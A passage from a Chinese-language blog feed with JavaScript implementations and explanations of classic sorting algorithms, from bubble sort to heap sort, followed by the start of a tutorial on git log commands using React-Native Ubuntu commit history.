input[i] = [input[min], input[min] = input[i]][<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.1-elementary-sorts/bubble.js">冒泡排序</a>，就更简单了，从第一个元素开始，往后比较，遇到比自己小的元素就交换位置，交换的次数最多，自然也是性能最差的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">bubble</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = input.<span class="property">length</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(input[j] &lt; input[i]) &#123;</span><br><span class="line">        input[j] = [input[i], input[i] = input[j]][<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对随机性排列不同（比如完全随机，顺序，倒序，半顺序等状态）的数据，三种效果也是不一样的，可以思考下。</p><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><p>上面提到了三种最基本的排序算法，这里要提到的希尔排序，有点不好理解。</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.1-elementary-sorts/shell.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.1-elementary-sorts&#x2F;shell.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shell</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> h = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> len = input.<span class="property">length</span>;</span><br><span class="line">  <span class="keyword">while</span>(h &lt; <span class="title class_">Math</span>.<span class="title function_">floor</span>(len / <span class="number">3</span>)) &#123;</span><br><span class="line">    h = h * <span class="number">3</span> + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(h &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = h; i &lt; len; i++)  &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> j = i; j &gt;= h; j -= h) &#123;</span><br><span class="line">        <span class="keyword">if</span>(input[j] &lt; input[j - h]) &#123;</span><br><span class="line">          input[j] = [input[j - h], input[j - h] = input[j]][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    h = <span class="title class_">Math</span>.<span class="title function_">floor</span>(h / <span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>算法复杂不代表需要很多的代码去实现，因为代码表达的是过程，通过循环等方式可以很迅速实现一个过程，而算法是处理问题的方法，把它表达清楚可能就得费不少唇舌，甚至还得配上一些图辅助阅读。</p><p>希尔排序，大概的思路就是不断地从整体上调整数据的顺序，将比较大的数据尽量往后挪，比较小的数据尽量往前挪。数据的搬移也不是一步完成，每一次搬移都会将数据分块，分块的目的是尽可能的搬移距离比较远的数据，从而减少比较操作和交换操作。</p><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>基本排序和希尔排序是都是从头到尾去遍历数据，不可避免的带来很多交换操作。归并排序是一种用空间换时间的排序算法，一个数组截断成两个子数组，子数据排好序后合并到一起。</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.2-mergesort/merge.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.2-mergesort&#x2F;merge.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">input1, input2</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> output = [];</span><br><span class="line">  <span class="keyword">while</span>(i &lt; input1.<span class="property">length</span> || j &lt; input2.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(i == input1.<span class="property">length</span>) &#123;</span><br><span class="line">      output.<span class="title function_">push</span>(input2[j++]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j == input2.<span class="property">length</span>) &#123;</span><br><span class="line">      output.<span class="title function_">push</span>(input1[i++]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(input1[i] &lt; input2[j]) &#123;</span><br><span class="line">      output.<span class="title function_">push</span>(input1[i++]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      output.<span class="title function_">push</span>(input2[j++]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是一个简单的合并算法，将两个有序数据合并为一个。有人应该会想到，既然一个数组可以打散成两个进行排序，那被打算的子数组是不是也可以继续被打散呢？</p><p>答案是肯定的。这是一种典型的<strong>分治思想</strong>，递归归并。</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.2-mergesort/mergeRecursiveTop2Bottom.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.2-mergesort&#x2F;mergeRecursiveTop2Bottom.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mergeRecursiveTop2Bottom</span>(<span class="params">input</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">sort</span>(input, <span class="number">0</span>, input.<span class="property">length</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sort</span>(<span class="params">arr, start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(start &gt;= end) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> mid = ((end - start) &gt;&gt; <span class="number">1</span>) + start;</span><br><span class="line">    <span class="title function_">sort</span>(arr, start, mid);</span><br><span class="line">    <span class="title function_">sort</span>(arr, mid + <span class="number">1</span>, end);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(arr, start, mid, end);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">arr, start, mid, end</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> i = start, j = mid + <span class="number">1</span>, tmp = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> k = start; k &lt;= end; k++) &#123;</span><br><span class="line">      tmp[k] = arr[k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(k = start; k &lt;= end; k++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(i &gt; mid) &#123;</span><br><span class="line">        arr[k] = tmp[j++];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(j &gt; end) &#123;</span><br><span class="line">        arr[k] = tmp[i++];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(tmp[i] &lt; tmp[j]) &#123;</span><br><span class="line">        arr[k] = tmp[i++];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        arr[k] = tmp[j++];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的算法是自顶向下的递归归并，简单来说就是解决很多小问题，那么大问题也就自然而然的解决了；还有一种自底向上的归并，这种归并简单来说，就是把一个大问题分解为多个小问题，多个小问题的答案就能得出大问题的答案。从解决问题的方式来看，两种处理方式是互逆的。</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.2-mergesort/mergeRecursiveTop2Bottom.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.2-mergesort&#x2F;mergeRecursiveTop2Bottom.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> sz = <span class="number">1</span>, len = arr.<span class="property">length</span>; sz &lt; len; sz = sz * <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> start = <span class="number">0</span>; start &lt; len - sz; start += sz * <span class="number">2</span>) &#123;</span><br><span class="line">      arr = <span class="title function_">merge</span>(arr, start, start + sz - <span class="number">1</span>, <span class="title class_">Math</span>.<span class="title function_">min</span>(start + sz * <span class="number">2</span> - <span class="number">1</span>, len - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// merge 函数同上</span></span><br></pre></td></tr></table></figure><p>不过自底向上的归并，在代码上稍微难理解一些，脑海重要有清晰的画卷，知道程序跑到哪一步了，尤其还需要处理边界问题。</p><h2 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h2><p>上面讨论了归并排序，将一个数组拆分成两个，然后合并处理，进而有了递归归并的思考。</p><p>而本节提出了一种更加高效的排序方法，这种算法跟归并排序是互补的，归并排序大致思路是<code>分-排序合</code>，而本节提出的快排采用的思路是<code>排序分-合</code>，把排序这种损耗比较大的操作前置了，所以效率更高。</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.3-quicksort/quicksort.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.3-quicksort&#x2F;quicksort.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">quicksort</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="title function_">sort</span>(<span class="number">0</span>, input.<span class="property">length</span> - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sort</span>(<span class="params">start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(start &gt;= end) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> mid = <span class="title function_">partition</span>(start, end);</span><br><span class="line">    <span class="title function_">sort</span>(start, mid - <span class="number">1</span>);</span><br><span class="line">    <span class="title function_">sort</span>(mid + <span class="number">1</span>, end);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">partition</span>(<span class="params">start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> i = start, j = end + <span class="number">1</span>, k = input[start];</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span>(input[++i] &lt; k) <span class="keyword">if</span>( i === end) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">while</span>(input[--j] &gt; k) <span class="keyword">if</span>( j === start) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span>(i &gt;= j) <span class="keyword">break</span>;</span><br><span class="line">      input[i] = [input[j], input[j] = input[i]][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    input[j] = [input[start], input[start] = input[j]][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个算法写起来，感觉相当酸爽，因为这个排序思路太棒，情不自禁地热血沸腾。事实上，这个算法也是存在几个疑点的：</p><ul><li>代码中的 <code>mid</code> 这个「哨兵」为啥要取第一个呢？</li><li><code>partition</code> 函数当 <code>end - start</code> 很小的时候效率还高么？</li></ul><p>于是有了两个想法：</p><ul><li>使用 <code>input</code> 的中位数作为「哨兵」</li><li>当 <code>end - start</code> 比较小的时候，大约为 5~15，改为其他比较高效的算法</li></ul><p>今天只对第二个想法做了实践，基本改造如下：</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.3-quicksort/quicksortImprove.js">chapters&#x2F;chapter-2-sorting&#x2F;2.3-quicksort&#x2F;quicksortImprove.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> delta = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">quicksortImprove</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="title function_">sort</span>(<span class="number">0</span>, input.<span class="property">length</span> - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sort 和 partition 函数同上</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">insertion</span>(<span class="params">start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = start + <span class="number">1</span>, len = end - start; i &lt; end; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> j = i; j &gt; start; j--) &#123;</span><br><span class="line">        <span class="keyword">if</span>(input[j] &lt; input[j - <span class="number">1</span>]) &#123;</span><br><span class="line">          input[j] = [input[j - <span class="number">1</span>], input[j - <span class="number">1</span>] = input[j]][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化后的快排"><a href="#优化后的快排" class="headerlink" title="优化后的快排"></a>优化后的快排</h3><p>上面提到了快排和快排的改进算法。当待排序的数据中存在大量重复元素时，快排的效率会不太高，当遇到重复元素的时候，比较和交换都是赘余的，重复元素越多，性能越差，为了解决这个问题，我们引入了第三个变量，来标识重复元素区间，如下图所示：</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+---------------------------------+</span></span><br><span class="line"><span class="section">|  &lt;v  |  =v  |=========|   &gt; v   |</span></span><br><span class="line"><span class="section">+---------------------------------+</span></span><br><span class="line"><span class="code">       ↑      ↑         ↑</span></span><br><span class="line"><span class="code">      lt      i         gt</span></span><br></pre></td></tr></table></figure><p>大致的原理是：每次排序分组的时候，就会过滤掉重复元素，这样，进入递归的元素就少了很多，因此而提高效率。</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.3-quicksort/quick3way.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.3-quicksort&#x2F;quick3way.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">quick3way</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="title function_">sort</span>(<span class="number">0</span>, input.<span class="property">length</span> - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sort</span>(<span class="params">start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(start &gt;= end) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lt = start, gt = end, i = start + <span class="number">1</span>, v = input[start];</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= gt) &#123;</span><br><span class="line">      <span class="keyword">if</span>(input[i] &lt; v) &#123;</span><br><span class="line">        input[lt] = [input[i], input[i] = input[lt]][<span class="number">0</span>];</span><br><span class="line">        lt++; i++;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(input[i] &gt; v) &#123;</span><br><span class="line">        input[gt] = [input[i], input[i] = input[gt]][<span class="number">0</span>];</span><br><span class="line">        gt--;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        i++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sort</span>(start, lt - <span class="number">1</span>);</span><br><span class="line">    <span class="title function_">sort</span>(gt + <span class="number">1</span>, end);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优先队列，堆排序"><a href="#优先队列，堆排序" class="headerlink" title="优先队列，堆排序"></a>优先队列，堆排序</h3><p>从最开始基本的冒泡、插入、选择和希尔排序，到分治思想的延伸——归并排序（自顶向下和自底向上），再到归并排序的互补算法——快排，然后学习了新的数据结构——二叉堆，于是有了堆排序。</p><p>二叉堆是一种数据结构，他的每一个二叉树点元素数值都会比下面两个节点元素的数值要大，因为这种数据接口包含的信息量很大，而得到这种数据结构的成本是很低的，构建一个二叉堆的算法并不复杂：</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.4-priority-queues/priorityQueueAdd.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.4-priority-queues&#x2F;priorityQueueAdd.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">priorityQueueAdd</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> output = [];</span><br><span class="line"></span><br><span class="line">  output[<span class="number">1</span>] = input[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>, len = input.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">    output = <span class="title function_">swim</span>(output, input[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> output;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swim</span>(<span class="params">arr, val</span>) &#123;</span><br><span class="line">    arr.<span class="title function_">push</span>(val);</span><br><span class="line">    <span class="keyword">var</span> k = arr.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k &gt; <span class="number">1</span> &amp;&amp; arr[k &gt;&gt; <span class="number">1</span>] &lt; arr[k]) &#123;</span><br><span class="line">      <span class="keyword">var</span> p = k &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      arr[p] = [arr[k], arr[k] = arr[p]][<span class="number">0</span>];</span><br><span class="line">      k = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上浮的方式，不断插入新元素，既可形成一个二叉堆。这种优先队列最大的特点是，能够拿到很快拿到最大元素（顶部），当这个最大元素被删除（优先级最高的事务被处理完成）时，还能快速高效地将剩下的元素重整为一个二叉堆：</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.4-priority-queues/priorityQueueDelete.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.4-priority-queues&#x2F;priorityQueueDelete.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">priorityQueueDelete</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> output = [];</span><br><span class="line"></span><br><span class="line">  input.<span class="title function_">splice</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  output = <span class="title function_">sink</span>(input);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> output;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sink</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    arr.<span class="title function_">splice</span>(<span class="number">1</span>, <span class="number">0</span>, arr.<span class="title function_">pop</span>());</span><br><span class="line">    <span class="keyword">var</span> k = <span class="number">1</span>, N = arr.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">2</span> * k &lt;= N) &#123;</span><br><span class="line">      <span class="keyword">var</span> j = <span class="number">2</span> * k;</span><br><span class="line">      <span class="keyword">if</span>(j &lt; N &amp;&amp; arr[j] &lt; arr[j + <span class="number">1</span>]) j++;</span><br><span class="line">      <span class="keyword">if</span>(arr[k] &gt;= arr[j]) <span class="keyword">break</span>;</span><br><span class="line">      arr[k] = [arr[j], arr[j] = arr[k]][<span class="number">0</span>];</span><br><span class="line">      k = j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个二叉堆能够快速拿到最大元素，并且能够立即重新调整为二叉堆，基于这个特性，就有了<strong>堆排序</strong>：</p><p>代码：<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.4-priority-queues/heapSort.js">&#x2F;chapters&#x2F;chapter-2-sorting&#x2F;2.4-priority-queues&#x2F;heapSort.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">heapSort</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">sort</span>(input);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sort</span> (arr)&#123;</span><br><span class="line">    <span class="keyword">var</span> N = arr.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> k = N &gt;&gt; <span class="number">2</span>; k &gt;= <span class="number">1</span>; k--) &#123;</span><br><span class="line">      arr = <span class="title function_">sink</span>(arr, k, N);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(N &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      arr[<span class="number">1</span>] = [arr[N], arr[N] = arr[<span class="number">1</span>]][<span class="number">0</span>];</span><br><span class="line">      N--;</span><br><span class="line">      arr = <span class="title function_">sink</span>(arr, <span class="number">1</span>, N);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sink</span>(<span class="params">arr, k, N</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">2</span> * k &lt;= N) &#123;</span><br><span class="line">      <span class="keyword">var</span> j = <span class="number">2</span> * k;</span><br><span class="line">      <span class="keyword">if</span>(j &lt; N &amp;&amp; arr[j] &lt; arr[j + <span class="number">1</span>]) j++;</span><br><span class="line">      <span class="keyword">if</span>(arr[k] &gt;= arr[j]) <span class="keyword">break</span>;</span><br><span class="line">      arr[k] = [arr[j], arr[j] = arr[k]][<span class="number">0</span>];</span><br><span class="line">      k = j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>光看代码还是挺难理解的，脑海中必须有一个数组储存的堆模型。for 循环构造了堆（从 N&#x2F;2 开始，跳过了所有大小为 1 的堆），注意，这里构造的并不是二叉堆，然后 while 循环将最大的元素 a[1] 和 a[n] 交换位置并修复堆，如此循环直到堆为空。</p><p>上面的排序用到的是 sink 方法，而 swim 方法也是可以用于排序算法之中的，这就是对应的<strong>下沉排序</strong>，感觉有点难理解。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>能够从上往下看到这里的，需要给你点个赞。算法的学习刚开始有点枯燥，也有点艰难，学着学着，慢慢的就能够领悟其中的趣味。</p><p>后续我也会投入一部分精力深入研究算法，希望可以通过一定量的算法实践大幅度提升自己的思维能力和动手能力。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有意思的 git-log</title>
      <link href="/blog/2016/08/04/funning-gitlog/"/>
      <url>/blog/2016/08/04/funning-gitlog/</url>
      
        <content type="html"><![CDATA[<p>之前写过几篇 git 相关的文章，内容很基础，</p><ul><li><a href="//www.barretlee.com/blog/2014/04/28/git-roll-back/">git版本回退操作</a></li><li><a href="//www.barretlee.com/blog/2014/04/30/switch-branch-in-git/">git切换到远程分支</a></li><li><a href="//www.barretlee.com/blog/2014/05/07/cb-git-improve/">git版本管理策略及相关技巧(A)</a></li></ul><p>但发现最近被搜索引擎检索的量还比较大，最近正好在阅读 git 相关的资料，准备将不错的几个点，详细地说一说，记录下来写出来分享给大家。今天要说的便是常用的 <code>git log</code> 命令。</p><span id="more"></span><h3 id="先看几个栗子"><a href="#先看几个栗子" class="headerlink" title="先看几个栗子"></a>先看几个栗子</h3><p>以 React-Native 代码为例，演示几个有意思的 git-log 命令。</p><ul><li><p>普通查看：<code>git log</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">commit</span> f84120a1669cd3a6c8db5e830a96565fa07d3ba8</span><br><span class="line">Author: Justin McPherson <span class="operator">&lt;</span>justin.mcpherson<span class="variable">@canonical</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Thu Aug <span class="number">4</span> <span class="number">18</span>:<span class="number">09</span>:<span class="number">50</span> <span class="number">2016</span> <span class="operator">+</span><span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Update</span> README</span><br><span class="line"></span><br><span class="line">    <span class="operator">-</span> Correct URL <span class="keyword">of</span> git repo.</span><br><span class="line">    <span class="operator">-</span> Mention supported Ubuntu variants.</span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span> cf3ade3eff98baf710d9f4134aa9ddde2ad96920</span><br><span class="line"><span class="keyword">Merge</span>: <span class="number">25</span>a5a12 d47218e</span><br><span class="line">Author: Justin McPherson <span class="operator">&lt;</span>justin.mcpherson<span class="variable">@canonical</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Thu Aug <span class="number">4</span> <span class="number">17</span>:<span class="number">57</span>:<span class="number">25</span> <span class="number">2016</span> <span class="operator">+</span><span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Merge</span> pull request #<span class="number">1</span> <span class="keyword">from</span> RodrigoHahn<span class="operator">/</span>patch<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    Rename README.ubuntu <span class="keyword">to</span> README<span class="operator">-</span>ubuntu.md</span><br></pre></td></tr></table></figure></li><li><p>简略形式：<code>git log --oneline</code></p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">f84120a <span class="keyword">Update</span> README</span><br><span class="line">cf3ade3 <span class="keyword">Merge</span> pull request #1 from RodrigoHahn/patch-1</span><br><span class="line">d47218e <span class="keyword">Rename</span> README.ubuntu to README-ubuntu.md</span><br><span class="line">25a5a12 react: Don&#x27;t throw exceptions <span class="keyword">on</span> <span class="keyword">error</span></span><br><span class="line">4ced394 Cleanup</span><br><span class="line">c1bd457 Improve Image support</span><br><span class="line">7d0fa11 Improve <span class="keyword">timer</span> handling</span><br><span class="line">88b7cef <span class="keyword">Move</span> tmp directory into the ubuntu root</span><br><span class="line">f240917 <span class="keyword">Update</span> <span class="keyword">for</span> README</span><br><span class="line">e19c816 Refinements+fixes to running and packaging.</span><br><span class="line">8302160 Don&#x27;t specify current directory <span class="keyword">for</span> generic node executable.</span><br><span class="line">135ecc5 Executor and Packaging <span class="keyword">update</span>.</span><br><span class="line">dafb051 <span class="keyword">Copy</span> assets to phone <span class="keyword">on</span> <span class="keyword">run</span></span><br><span class="line">e6aec7a Fix packaging step <span class="keyword">for</span> assets</span><br></pre></td></tr></table></figure></li><li><p>查看详细修改：<code>git log -p -2</code>，只看最近两条</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">commit f84120a1669cd3a6c8db5e830a96565fa07d3ba8</span><br><span class="line">Author: Justin McPherson &lt;justin.mcpherson@canonical.com&gt;</span><br><span class="line">Date:   Thu Aug 4 18:09:50 2016 +1000</span><br><span class="line"></span><br><span class="line">    Update README</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/README-ubuntu.md b/README-ubuntu.md</span></span><br><span class="line"><span class="comment">index ad3574f..0a732f8 100644</span></span><br><span class="line"><span class="comment">--- a/README-ubuntu.md</span></span><br><span class="line"><span class="comment">+++ b/README-ubuntu.md</span></span><br><span class="line"><span class="meta">@@ -3,6 +3,10 @@</span></span><br><span class="line"><span class="addition">+### Platforms</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+There is support for applications on both Desktop Ubuntu and Ubuntu Touch.</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> You should have an Ubuntu 16.04 (Xenial Xerus) installation.</span><br><span class="line"><span class="meta">@@ -32,7 +36,7 @@</span> ubuntu need to be published to a local package repository.</span><br><span class="line"> Download the port for Ubuntu.</span><br><span class="line"></span><br><span class="line"> ~$ mkdir src; cd src</span><br><span class="line"><span class="deletion">-~/src$ git clone https://git.launchpad.net/reactnative-ubuntu -b ubuntu</span></span><br><span 